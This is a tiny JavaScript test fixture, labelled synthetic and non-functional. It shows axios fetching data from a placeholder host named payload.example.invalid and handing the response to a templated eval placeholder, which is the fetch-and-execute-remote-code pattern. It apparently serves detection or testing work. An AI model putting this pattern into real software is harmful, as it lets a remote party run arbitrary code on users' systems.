// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

axios.get("https://payload.example.invalid/n").then((r) => {
  {{EVAL}}(r.data);
});
